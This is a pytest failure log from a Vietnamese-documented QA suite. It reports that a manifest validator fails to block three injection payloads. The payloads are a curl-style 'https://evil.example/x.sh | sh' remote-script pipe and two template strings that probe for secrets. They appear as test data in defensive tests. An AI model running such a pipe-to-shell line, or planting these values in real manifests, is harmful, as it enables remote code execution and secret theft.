@@ -1,0 +1,110 @@
+....................FFF...                                               [100%]
+=================================== FAILURES ===================================
+_ test_run_installer_ref_with_url_pipe_to_shell_is_NOT_blocked_by_manifest_layer _
+
+    def test_run_installer_ref_with_url_pipe_to_shell_is_NOT_blocked_by_manifest_layer() -> None:
+        """DEFECT: ``namios_recipe._parse.parse_recipe_steps`` (WP10) chặn
+        ``installer_ref`` chứa ``https://...|sh`` (xem
+        ``test_url_script_pipe_to_shell_in_installer_ref_is_rejected`` trong
+        ``tests/unit/recipe/test_parse_allowlist.py``). Nhưng khi CÙNG payload
+        này đi qua đường ``ManifestValidatorImpl.load()``/``build_manifest()``
+        (lớp phòng thủ của WP2 — thứ được dùng thật khi nạp một manifest từ
+        kho/catalog), nó KHÔNG bị chặn: schema PASS, build_manifest() build
+        thành công, và ``validate_semantic().install_ready`` vẫn ``True``.
+    
+        Đây là một lỗ hổng injection thật (COMP-004 "manifest chứa shell/
+        URL-script" phải bị chặn) vì ``RunInstaller.installer_ref`` là dữ liệu
+        publisher-controlled đi tới bước cài đặt — nếu mọi thứ khác (acquisition
+        policy, host allowlist...) có sơ hở ở downstream, chuỗi
+        ``| sh`` này là payload RCE cổ điển.
+        """
+    
+        raw = mutate(baseline_manifest())
+        raw["recipe"] = [
+            {
+                "action": "run_installer",
+                "params": {
+                    "installer_ref": "https://evil.example/x.sh | sh",
+                    "argv": ["installer.exe", "/S"],
+                },
+            }
+        ]
+    
+        validator = ManifestValidatorImpl()
+        schema_result = validator.validate_schema(raw)
+        assert schema_result.ok is True  # tầng 1 không soi nội dung param (chủ ý, by design)
+    
+        # KỲ VỌNG AN TOÀN (như namios_recipe/WP10 đã làm cho CÙNG payload):
+        # build_manifest() phải raise ManifestLoadError với E_SEMANTIC_RECIPE.
+        # Nếu dòng dưới FAIL vì build_manifest() KHÔNG raise — đó là bằng chứng
+        # defect MAN-03-QA-01 (xem evidence-index/T1), KHÔNG phải test sai.
+>       with pytest.raises(ManifestLoadError) as exc_info:
+E       Failed: DID NOT RAISE ManifestLoadError
+
+tests/qa/T1/test_man03_recipe_injection_adversarial.py:67: Failed
+_ test_set_registry_value_with_template_interpolation_is_NOT_blocked_by_manifest_layer _
+
+    def test_set_registry_value_with_template_interpolation_is_NOT_blocked_by_manifest_layer() -> (
+        None
+    ):
+        """DEFECT tương tự: ``{{ secrets.admin_password }}`` trong
+        ``set_registry_value.params.value`` bị ``namios_recipe._parse`` (WP10)
+        chặn (xem ``test_template_interpolation_in_value_is_rejected``), nhưng
+        lọt qua ``namios_manifest._recipe_build`` (WP2) vì ``_require_str`` ở
+        đó không gọi scan injection nào."""
+    
+        raw = mutate(baseline_manifest())
+        raw["recipe"] = [
+            {
+                "action": "set_registry_value",
+                "params": {
+                    "key": "HKCU\\Software\\Demo",
+                    "value_name": "Mode",
+                    "value_type": "REG_SZ",
+                    "value": "{{ secrets.admin_password }}",
+                },
+            }
+        ]
+    
+        validator = ManifestValidatorImpl()
+        assert validator.validate_schema(raw).ok is True
+    
+        # Kỳ vọng an toàn: raise E_SEMANTIC_RECIPE. FAIL ở đây = defect MAN-03-QA-02.
+>       with pytest.raises(ManifestLoadError) as exc_info:
+E       Failed: DID NOT RAISE ManifestLoadError
+
+tests/qa/T1/test_man03_recipe_injection_adversarial.py:98: Failed
+_ test_install_dependency_id_with_dollar_brace_template_is_NOT_blocked_by_manifest_layer _
+
+    def test_install_dependency_id_with_dollar_brace_template_is_NOT_blocked_by_manifest_layer() -> (
+        None
+    ):
+        """DEFECT tương tự ở ``install_dependency.dependency_profile_id`` với
+        cú pháp ``${env.SECRET_DEP}``. Nguy hiểm riêng ở field này: nếu
+        downstream (planner/helper) dùng ``dependency_profile_id`` để tra một
+        biến môi trường/secret store theo tên, injection template này có thể
+        là một đường dò secret, KHÔNG chỉ là "shell token"."""
+    
+        raw = mutate(baseline_manifest())
+        raw["runtime"]["dependency_profile_ids"] = ["${env.SECRET_DEP}"]
+        raw["recipe"] = [
+            {
+                "action": "install_dependency",
+                "params": {"dependency_profile_id": "${env.SECRET_DEP}"},
+            }
+        ]
+    
+        validator = ManifestValidatorImpl()
+        assert validator.validate_schema(raw).ok is True
+    
+        # Kỳ vọng an toàn: raise E_SEMANTIC_RECIPE ngay ở build_manifest(), TRƯỚC
+        # khi tới bước so khớp approved-list. FAIL ở đây = defect MAN-03-QA-03.
+>       with pytest.raises(ManifestLoadError) as exc_info:
+E       Failed: DID NOT RAISE ManifestLoadError
+
+tests/qa/T1/test_man03_recipe_injection_adversarial.py:126: Failed
+=========================== short test summary info ============================
+FAILED tests/qa/T1/test_man03_recipe_injection_adversarial.py::test_run_installer_ref_with_url_pipe_to_shell_is_NOT_blocked_by_manifest_layer
+FAILED tests/qa/T1/test_man03_recipe_injection_adversarial.py::test_set_registry_value_with_template_interpolation_is_NOT_blocked_by_manifest_layer
+FAILED tests/qa/T1/test_man03_recipe_injection_adversarial.py::test_install_dependency_id_with_dollar_brace_template_is_NOT_blocked_by_manifest_layer
+3 failed, 23 passed in 0.26s
